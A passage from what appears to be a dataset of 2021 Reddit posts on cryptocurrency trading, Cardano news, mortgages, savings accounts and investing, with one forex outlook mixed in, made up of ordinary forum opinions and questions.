14. Track all your numbers, your gains, your investments and portfolio change religiously, preferably in an excel document.  That way you'll know how you are performing and if something is going wrong.  Again, I wish I had done this more in 2018.
15. Have an ""emergency reserve"".  For me, this is actually my stock positions, many which are crypto related, but you could have gold or cash (I especially like the idea of something like stable coins lent on FTX at a decent interest rate).  If we get some kind of crypto turbo dump which is 40%, you can then have that as money on the side-lines ready to buy.
16. Constantly educate yourself.  For me, I still need 3-4 hours a day to research and learn about crypto.  I find crypto podcasts and even youtube vital sources of information, provided you are listening to the right people.  Mix up your education with news, technical strategies, trading updates, altcoin news and even just the general philosophy behind sound money and financial sovereignty.
17. If you win or lose on a trade, delete that coin from blockfolio immediately.  Why?  Because you have exited that position, and seeing it jump up again in price is just going to torment you.  You've made the decision to sell, don't even up revenge trading where you come back and try and get your losses back on the same trade.
18. Never margin trade UNLESS it is only because you want to minimise your funds at risk on an exchange.  Even then I'd avoid it.  Unfortunately many exchanges make this very hard to use - and there are confusing terms and default options which can rekt you (for example, positions that will drain your other funds instead of liquidiating the trade if falls too much).  In fact, I avoid almost all USD pairings and only trade BTC pairing, unless very special circumstances are in play (such as ripple being delisted from coinbase).
19. Never hold more than around 10 coins.  I used to have up to 40 at a time, it became impossible tracking them in terms of activity, prices, and god the horrors of trying to maintain enough wallets for them.  10 is enough diversification.  I used to have a ""bag"" of around 15 moonshots - that strategy never worked as even if one ""Gem"" actually made it big, the losses from the other ones cancelled out.  Typically if I had a huge gain from one of my coins, I sell back to BTC and waits for other opportunities.  This isn't Pokemon - don't try and ""catch them all"".
20. Falling in love with alt-coins is like falling in love at a stripclub.  Yes trade them.  But just be conscious that their chances of beating BTC long term are very unlikely.  Just look at all my 2013 gems (peer coin, feather coin etc).  Heck I bought World-Coin because I read about a ""bitcoin genius teenager"" who made millions from crypto and said World-Coin was the next bitcoin.  And I've made my mistakes as well going forward, holding on for dear life for nano (yes I know its fast and instant!) and grin.  I think the tech for both coins is great, that doesn't mean its a great trade.  If you want to marry your alt-coins then you will be lucky if you only lose half your money like a real world divorce :)
21. EDIT. Bonus one.  Always learn from your losses (and I have MANY).  I like to think of crypto as like a computer game where you are gaining new skills.  Think of RPG games like Baldur's Gate or Warcraft.  You can earn money or experience, and use that to gain new items or skills that protect you against certain things.  So maybe you lost $500 to a ""rug-pull""?  Well do your research and figure out how to avoid that next time.  Maybe you'll spend the next 2 weeks mad about it, but next time a potential rug-pull project comes along you'll dodge it - congratulations you now have learned ""immunity to rug-pulls"".   Keep learning and gaining more experience and you'll start avoiding all the traps.
22. EDIT 2:  You are going to have MANY scenarios where you see a coin that has gone x1000 or to some ridiculous crescendo, where you feel utterly compelled to buy to avoid missing out.  This is the obvious trap (if you want an example of this look at Safemoon right now.  Bitconnect was the one in 2017 and there are others).  At some point bitcoin or ethereum will do a similar run up, and many people outside crypto will do the same thing.  Yes this can be irresistible but you must resist the temptation - think of the cryptos has being a bunch of boats on the wharf, and there are thousands of boats.  Every day another hundred turn up.  Why are you going to try and jump across the water to get to the boat that is already leaving, when if you wait a bit another few dozen will turn up in five minutes?  You'll just fall in the water and miss out on those new boats!
23. If you must trade as a new-comer, I highly suggest trading the smaller / middle cap BTC pairs.  Not the USD or margin pairs.  Certainly not something like futures contracts on FTX.  Why?  Because if you are on bitmex / bybit / ftx etc you are swimming with the whales and sharks, quant funds, robo-traders and the like.  If you entered the casino for the first time in your life, would you immediately go to the blackjack table with James Bond and Dr Evil?  The smaller BTC pairs are more likely to have less experienced traders - my trades actually went positive once I moved from USD pairs on margin exchanges to spot BTC trades with altcoins.
24. Last edit before bed (I promise).  The chances are, crypto is still cyclical.  That means we will have another bear market, or at least a very long boring period of no gains.  If you have just joined crypto, you probably won't ""make it"" this cycle, as we may only have 6 months to a year to go.  I actually lost money (a lot) in BOTH the 2013 and 2017 bull markets (-50% and -85%, respectively).   All of my gains were made in the bear market when I was buying BTC and alts when BTC was in the 3ks.  The ""will you make it?"" test isn't coming now when the market seems to be going infinitely up and everybody is winning.  That test comes when everybody is selling and it seems like you are the only buyer.  And yeah, thousands of alt coins will suffer or die at that point.   So be around to scoop up the ashes - don't be the ashes!  This is all a larger part of learning to move with the cycles.

Anyway these are the ones that come to mind, hopefully that is helpful!  No doubt I'll edit this post and add a few more.",cryptocurrency
Bitcoin,Continued Money Printing,"A lot of Bitcoin Maximalists on the Internet (Michael Saylor for example) say that the Fed will continue to print money year over year. They talk about it like it is a fact and they use it as a key part of their BTC thesis.  


In my mind this is not a fact. I see the Government increasing the rate of their deficit spending and implementing obtuse policies to prevent a economic depression. I don't think this is as disruptive as money printing though. I wonder how BTC Maxi thesis hold up under a future of something short of money printing.  


Saylor uses metaphors like feeding the monetary fire. This metaphor sounds nice but leaves me wanting more.

I wish more people would push BTC Maxis more on this point so they can expand on their argument. What do you guys think?

cardano,Cardano Rumor Rundown APR 11 2021,"Hey Everyone!

I've been consuming all the Cardano news and media on a daily basis for years now. I figured it wouldn’t hurt to share a list of what I'm seeing for anyone else who's interested. Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list.

Check out the youtube companion to today’s post: [https://youtu.be/JAYcHI3Y\_ik](https://youtu.be/JAYcHI3Y_ik)

Let's go....

Newly covered today:

1. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.   [https://github.com/input-output-hk/plutus-pioneer-program](https://github.com/input-output-hk/plutus-pioneer-program)
2. There is now a website that will mint Cardano NFTs for you.  Thanks to Cardano subreddit user Padierfind. [https://www.nft-maker.io/](https://www.nft-maker.io/)
3. Yesterday was “Get ADA Day” with the end of Epoch 258.  I hope everyone did well in their staking.

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Catalyst Fund 3 Voting is ongoing, it looks like the Yoroi team has worked out the voting problem in the Yoroi wallet. [https://twitter.com/YoroiWallet/status/1369050858546200585](https://twitter.com/YoroiWallet/status/1369050858546200585)
4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
6. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
7. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
8. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

19. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal!

25. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.  [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development.  [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia.  This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega.  Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ourobouros Praos was 2017 and it’s still running now.  Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.

38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

 Week: 12-16.04.2021

## Key event: NZD. Interest Rate Decision

**RBNZ Interest Rate Decision is announced by the Reserve Bank of New Zealand. If the RBNZ is hawkish about the inflationary outlook of the economy and rises the interest rates it is positive, or bullish, for the NZD.**

**We expect a similar reading to the previous lecture. 0.25%**

**We do not expect this announcement to be relevant for the behavior of the NZD against other currencies during the week. More likely the technicals will be predominant. Only a very unexpected final data would affect the price action.**

## Key Levels:

* **Resistance  0.7100, 0.7000, 0.7450**
* **Support    0.6800**

## Trend NZD/USD:

**Bearish/Neutral**

**Price broke down two weeks ago the 0.7100 support level, turning it into key resistance. Price has formed a lower low; now a lower high would confirm a trend reversal.** 

## Call to Action/Trade Idea

**We will look to sell near resistance levels. The previous support levels are now important resistances.**

personalfinance,Pre-Payment Penalty On Mortgage,"Hi, 

My father recently passed away. He handled all of the finances, and my mother just signed documents on the dotted line. Now my silbing and I want to help her out. All of us reside in California. 

Dad took out a mortgage on a small office he owns a few years ago. The principal balance is near 95K with an interest rate of 8.5%! That's super-high, right? My brother and I want to aggressively pay it down (and have the ability to pay tens of thousands right now). 

My mom said she didn't think there would be a prepayment penalty, so I called the mortgage company to confirm and wasn't ready for the numbers a representative started throwing at me.  I'm hoping the replies here will help prepare me when I call again. 

At one point I asked, ""If in some alternate universe we just had the cash on hand to pay this off tomorrow in full, what would be the penalty?"" In my notes I have written ""$1008.90,"" which I find difficult to believe. My father paid double that in interest for the year so far. Did I likely record the number wrong? Am I missing something here? This penalty does not seem nearly as harsh as the interest rate. Do they frame this as ""penalty"" as a psychological deterrent so they can collect their pot of gold? 

We can apparently pay 20% each year without penalty, and she quotes a number close to $19,000 (which makes sense with a 95K balance). So I said, ""Can I just write a check next month for $10,911?"" (i.e., the min. payment + $10,000) and she muttered something about not paying more than $5,000 to the balance at one time, and we ""should be fine"" (as in not run afoul of penalties).   I  don't understand why that would be the case. 

Another fine I have written down here is $20.42. Checking past threads here, I saw someone complaining about a $30 pre-payment penalty. Again, I don't know why I should care that much about such penalties if we're paying so much more in interest.",finance
personalfinance,Canadian Account to Invest in US Stocks Using Debt,"I will be graduating my final year of law school this month and was planning on borrowing the $50k student LOC (2.45% interest rate) I have left to put into stocks. My plan was to put $30k into VFV, and then the remaining $20k into a couple of hand-picked US stocks such as MSFT, AAPL, GOOGL, SQ, V or MA, MCK, etc (I still need to do some research for my finalized list) after Norbert's Gambiting it to USD.

My question is whether it might be better to do this through a non-registered account or through a registered one (probably TFSA). I ask because through a non-registered account I may deduct the interest on the debt in my taxes, but then dividends are taxed. Through a registered account dividends won't be taxed but I won't be able to deduct the interest. Or is there an ideal combination where VFV should go into a TFSA while the hand picked stocks go into a non-registered account?

Side note - any opinions on whether this is even a good idea or not would help as well. In my opinion, I would be stupid not to do this considering the low interest rate.",finance

personalfinance,Is T-Mobile Money worth it over traditional HYSA?,"Hello, so I'm basically getting my first salary out of professional school in a month and am budgeting for the next two years and something that has really caught my attention are high yield savings accounts. Initially, I was going to go with Ally since they seem to be reliable, are fast with federal rates, have competitive APYs, and appear to have great customer service. 

However, I recently started reading about T-Mobile Money accounts. I am already a T-Mobile customer, and when I read that they have an APY of 4% on the first $3,000  and 1% on the rest, I thought that was incredible. I guess my main sticking point is that it's a checking account vs being called a savings account. 

**My question is, is there any downside to using this checking account as a functional savings account vs just using a traditional HYSA like Ally?** 

I figure the only difference is that it's more tempting to pull money out of it, but if I have just a decent amount of self control then I could do well with the fantastic APY they have, correct? I'm a bit of a newbie at finance so apologies if this is a silly question. Thank you!",finance
CryptoCurrency,Is an inflationary currency really needed for economic growth?,"I've been thinking a lot about this subject lately after some comments I received on here about how crypto currencies would be unfit to serve as currency due to their deflationary tendencies and increasing values. 

While I certainly agree that volatility and transaction costs are certainly a barrier to adoption of any crypto as a usable currency I question the current world banking systems philosophy that a steady rate of inflation is necessary.

Inflation and low interest rates are certainly responsible for fueling a lot of growth, but I am just not convinced that it is entirely necessary. In my current line of thinking a currency without constant inflation would slowly gain in value a sort of built in savings mechanism whereby the relative value of wealth held would increase. 

I'm including some of the reading I've done and am interested to hear others thoughts.

CryptoCurrency,Almost Every Top Altcoin Is Way Overvalued,"Most of top crypto market capitalizations GREATLY exceed the cost of funding a competitive project. 

This implies that investors are assuming all of these projects will have an insurmountable first mover advantage. I believe this assumption comes from observing BTC's extremely strong first mover advantage and inferring that this will be the norm in the crypto space. I believe this assumption is incorrect, and the first mover advantage is fatally overvalued for most projects. 

Here's my logic:

1) BTC is unique because the core advantage of a first mover- a clear leader in popular adoption - happens to be a central, critical goal of BTC's utility that cements its price in a nonlinear fashion in the market. Store of value is an inherent utility, and BTC has a huge SOV first mover advantage. This is not the case for most other projects. 

I.e., nobody cares about the second most widely accepted store of value, and universal adoption is not linked to the viability of most other projects in the same way that it is for a project that seeks to compete as a second fiddle store of value. 

2) Few crypto projects have a comparable first mover advantage. If this point is self-evident to you, skip to the next point, otherwise, this is best illustrated with a verbose real world example: 

Consider the variability of first mover advantage of a company like eBay, which was a first mover across a huge swath of online sectors and categories of goods during the most critical snapshot of the early internet retail boom. Consider that there is no eBay in Japan, simply because yahoo auctions got there first. With all their success elsewhere, there was nothing eBay could do to compete in Japan.  It was too late.

But also consider that eBay was once the most visited e-commerce site on the internet, but has now, through unimpressive platform development, largely narrowed the dominance of its market to the domain of auction only listings and used consumer goods. EBay's first mover advantage is not universal across every market. EBay's lack of competitive innovation essentially reduced its scope to only the categories/sectors that benefited the most from its ""first mover"" advantage, while it's market share of everything else has steadily decreased. (Just making an observation, not here to discuss eBay's business plan or profitability.) 

This is because first mover advantages have very specific causes and limitations. A seller cannot auction an item on eBay and a competitor site at the same time, and sellers of low volume used goods generally cannot be bothered to create custom listings on multiple platforms as easily as sellers of high volume new goods. And because buyer market exposure affects maximum sale price, auction sellers and sellers of low volume products cannot avoid listing on the site that has the most potential buyers, regardless of their strong preference for competing sites with better platforms and policies. 

Maybe a sale listing is created on an eBay competitor site too, but always it is on eBay. This means eBay always has more listings, and therefore more buyers, and the cycle loops continuously and most sellers give up trying to leave eBay. Ask any eBay seller what they think about eBay, and the longer they have been there the more readily they will bad mouth it. It is extremely difficult for superior competition to unseat eBay.

EBay is a textbook first mover advantage, but notice what is usually overlooked in the story of eBay. Ebay's first mover advantage did not apply to new goods, and eBay saw a significant drop in market share of new goods caused by superior competition. Also notice that the advantage is not end-consumer driven, as consumers readily shop multiple sites, but the advantage primarily relies on the economics of unsynchronized merchants acting individually to get the best returns on their investments of time. Even within a single project, various functions will have dramatically different first mover advantages.

https://digital.hbs.edu/platform-digit/submission/ebay-the-perfect-storey-of-network-effects/

3) Any crypto project worth copying will be copied if it can be done for significantly less than the first mover is worth. We've already seen that the open source development of projects guarantees they will be copied. (And FYI, eventually there will be no way to enforce copyright and licensing agreements on decentralized networks (I'm not advocating for this, don't ban me again, bro)). 

Does anyone really think you couldn't develop something that surpasses uniswap or litecoin for a billion dollars? Cause those projects are currently worth $15+ billion. Even a seriously promising project like filecoin- currently $11.5 billion dollars? That valuation doesn't make any sense. It's current market cap has no correspondence to utility or investment risk but is purely, and irrationally, speculative. 

Filecoin is a great example, because it's an excellent project- and the story gets worse. Filecoin currently has a fully dilluted market cap of $347 billion dollars. 

It's got $350 billion worth of room for competition, and for a utility that has not been produced yet, that price does not make any reflection of the risk that it's first mover advantage is minimal, and it will have hard competition. 

Regardless of whether filecoin becomes the biggest decentralized file storage network, there is no chance that filecoin will not face competition, no chance that it's market cap won't lose its speculative valuation due to competition, and no chance that the people who bought FIL anywhere close to today's prices will avoid losing significant amounts of money. 

4) Some projects already have competition which are a better value. Look at the massive overlap of functionality of projects. And this is despite so few of these projects having produced a functioning product worth copying yet. Notice the pattern that the top functioning crypto projects are heavily centralized or proprietary. Again, the values that make BTC successful do not necessarily translate to other crypto projects. 

5) Any crypto project will eventually be adopted if its lower cost or superior function, relative to competition, exceeds its second mover disadvantages. Protocol and development infrastructure focused projects may have no first mover advantage at all. As developers will be driven by raw scalable utility and cost. 

Conclusion:
This is a red flag that we are deep in [dotcom boom territory](https://en.wikipedia.org/wiki/Dot-com_bubble?wprov=sfla1). The only question is when will new money stop coming in long enough for price floor discovery to occur? With covid crippling commercial real estate investments, money printing and low interest rates over inflating residential markets and stock markets, people are desparate to put their freshly printed fiat somewhere before it evaporates into the ether of inflation. 

The stock market blew up, and money has overflowed into crypto, but crypto markets are much riskier than traditional investments. This space is an unknown frontier and the value proposition of many of these coins is bloated well beyond inflation, and in some cases may not even exist. 

Current values are primarily speculative, not exemplary of use case demand (with the exception of projects where the use case explicitly is predictable speculation).

The top crypto market capitalizations appear to imply that investors currently undervalue this risk. Purchasing an equal weight of every top 50 alt coin right now, at current market prices, would be a very poor investment. Most of these projects will fail to maintain their current market capitalization under equilibrium demand against competitors.

personalfinance,"How to compare future savings of refinancing with its fees, payable today?","Hi all! My girlfriend and I have a loan for the apartment we bought 2 years ago. Since in Europe, the interest situation is very good currently (base rate around -0.5%), we're looking to refinance. Our current bank A already made us an offer, but we have another offer from bank B with a far better interest rate.

So I built a model to compare both options (see below if interested in the details). This gives me how much I would save per year on interest payments with option B.

Now some of the savings are far out - 20, 25, 28 years in the future. Since I need to compare the total savings with the cost I would have to pay today, in order to consider the time value of money, I discounted the future savings using the DCF formula assuming a 2% p.a. inflation rate (=Saving/(1.02)\^t).

Now I'm wondering whether that makes sense at all. Because If I save say 1000€ next year, I could reinvest them at perhaps 6%. Does that mean I should actually set the discount rate to -4% (2% inflation minus 6% I could make on the stock market)? Or should I use inflation - risk free rate (e.g. 10y treasury bond yield) as discount rate? Or use something different? Or simply drop the discounting altogether?

What's the best way to deal with this? All I know is that this assumption has a huge impact on whether to stay with our current bank or take up B's offer.

\-----

\* In case you're interested, the model is quite complex because the fixed interest term for A is 20 years + 10 years variable, whereas B offered 15 years fixed interest + 10 years variable, but of course the 2 years we already paid back also need to be taken into account. Also, with bank A I can make a 100% special repayment, while with bank B it's maximum 50,000€ a year.",finance

CryptoCurrency,This Wednesday is a big day for Ethereum,"4/14/21 is the date of the Berlin Hard Fork which will make the Ethereum network more optimized, meaning ~~less gas fees~~ and harder to jeopardize the network.

[https://blog.ethereum.org/2021/03/08/ethereum-berlin-upgrade-announcement/](https://blog.ethereum.org/2021/03/08/ethereum-berlin-upgrade-announcement/)

EIPs are proposals to network changes.

    Berlin EIPs
    The Berlin upgrade introduces the following EIPs to the Ethereum network:
    
    EIP-2565: ModExp Gas Cost
    Lowers the cost of the ModExp (0x00..05) precompile;
    
    EIP-2929: Gas cost increases for state access opcodes
    Increases gas cost for SLOAD, *CALL, BALANCE, EXT* and SELFEDESTRUCT when used for the first time in a transaction;
    
    EIP-2718: Typed Transaction Envelope
    Introduces a new transaction type that is an envelope to enable easier support for multiple transaction types;
    
    EIP-2930: Optional access lists
    Adds a transaction type which contains an access list, a list of addresses and storage keys that the transaction plans to access. This mitigates some of the gas cost increases introduced by EIP-2929.

It also happens to coincide with the Coinbase IPO, and thus the stock market will get more exposure to crypto. Hopefully some of the stock hype will get people buying ETH.

EDIT. Make fees more predictable but it doesn't necessary mean reduce fees. Sorry about that.",cryptocurrency

CryptoCurrency,Update on deep-diving through Penny cryptos on KuCoin (Part Two),"Two months ago, I made this post:

**https://np.reddit.com/r/CryptoCurrency/comments/li2pq5/deep_diving_through_penny_cryptos_on_kucoin/**

I was trying to search for low-cost coins that had the potential to pump.  At the time, there was a lot of talk about DOGE coin and how a lot of low information, new-to-the-market buyers simply bought into it because of the meme factor and celeb exposure.  

But there were also a lot who were buying into it because the coin was relatively cheap compared to others in the top 10, leading some to think that ""if it catches up to Bitcoin, I can increase my investment by 800,000%!!""  Despite the absurdity of it, I thought there was a window of opportunity to find another cheap coin with a lower market cap that could ride a wave of ""let's get it to a dollar!""

**How did I try to find them?**

I tried to utilize an objective, data-driven algorithm that was free of interpretive subjectivity (as much as selecting what factors were important enough to plug into the equation can still be considered objective, of course...).  You can read a quick blurb about the 6 inputs I used at the link provided at the top, but they were: Limited supply, Current circulating supply percentage, Date made available on exchanges, GitHub activity, News and social media activity, Market cap OVER volume traded (again, some of these are difficult to quantify into a standardized comparison).

**How did they do?**

I ended up identifying 5 coins, (plus 1 honorable mention aberration, more on it later...)

* 1) ONE **Price at the time:** .018 **Price today:** .1476  **increase:** 720%

* 2) KLV **Price at the time:**  .008 **Price today:** .0913  **increase:** 1042%

* 3) NIM **Price at the time:** .005 **Price today:** .0121 **increase:**  142%

* 4) IOTX **Price at the time:**  .016 **Price today:** .0498 **increase:**  211%

* 5) ANKR **Price at the time:** .019 **Price today:** .1456 **increase:**  666(!)%

* Honorable mention: XNS (Insolar) **Price at the time:** .006 **Price today:** 0.0000 **Change:** all gone

Before throwing a Triumph for myself, the Total Market Capitalization over the same period has increased from $1.4 trillion to $2 trillion today, so just randomly throwing your money into the market at the right time would be about a 43% increase on average, which is the baseline to evaluate success across this time period.  Just deciding to put money into Crypto in February should have been a successful decision.  For additional comparisons, there were several other coins available on KuCoin that had limited supply and were also around a penny that I avoided because they didn't do as well in my algorithm:

* Electroneum **Price at the time:** .006 **Price today:** .0265  **increase:** 342%

* Sentivate **Price at the time:**  .008 **Price today:** .0231 **increase:** 189%

* QuarkChain **Price at the time:** .010  **Price today:** .0406  **increase:** 306% 

* AnimalGo **Price at the time:**  .012 **Price today:** .0133 **increase:** 16%

* Te-Food **Price at the time:**  .019 **Price today:** .0613 **increase:** 222%

So it seems buyers were definitely looking for that next penny coin to pump.  Although the ones I ultimately avoided didn't do as well as the ones I selected, they still had incredible returns.  This is a testament to having a plan in place, sticking to your research, and (mostly) the timing of the market.

In the two months since then, ONE has boomed, became a r/cryptocurrency darling, and then had a stumble that may have been caused by a bad tweet.  It was the only coin that nailed all of the criteria and I ended up going hard into it.  KLV has produced the best returns, in part because of an upcoming burn, expansion into various coin exchanges and adoption worldwide, and an incredibly active social network team.  Having a robust online presence is not valued enough, I think, though it is harder to quantify objectively.  NIM and IOTX I still think still have strong cases for growth.  NIM has had a few leaps, while IOTX has had steady growth.  ANKR has also done incredibly well.  They appear going through a a hiring push, so that could bode well for their future.

And now, the elephant in the room, the (dis)Honorable mention of XNS (Insolar).  It performed well in my algorithm, yet I avoided it because it was so new and had a TON of volume traded activity for having so little market cap.  I even said ""I think it will be an interesting coin to watch.""

Well, it turned out to be a complete scam.  It was eventually removed from KuCoin, but this is a great lesson to remember to look out for the snakes in the grass in the Cryptoworld.  They even had a sizable social media presence and fair amount of activity on Github.  Buyer beware, indeed.

**So now what?**

Since then, I've increased my positions in the 5 coins and started looking for more, but I highly doubt we'll see two months returns like that again. The overall market is much different then it was even two months ago and this time, there were much fewer coins that hit my metrics, let alone were still at a low price.  Perhaps buyers are more sophisticated and don't simply pay attention to price per coin anymore, but that remains to be seen.

The long-shots still at a penny or less are largely the same ones I combed through already before.  There were some new coins that scored fairly high compared to the others, although I am not nearly as sold on them as I was on my original go around.  I want to be very clear, I am not nearly as excited about this batch as I was during the initial go-around.  Firstly, I don't like buying after pumps.  Secondly, they didn't score as high in my algorithm as the first batch.  Still, the ones I like best in this bunch are:

* TEL (51% supply, active socials, wish there was more volume though)

* ENQ (they just had a MASSIVE pop, so I did the part two write-up just a little too late...)

* BTM (at .18, it's higher than I'd like the price to be for this endeavor, but they have good metrics and an upcoming planned burn)

* VRA (maybe the one of these I like best, also has a really good use case and could be a big player in online advertising, it's just a little frustrating because it was at .001 when I stumbled across it before, now it's about at .05, which would have dwarfed even my ONE call...)

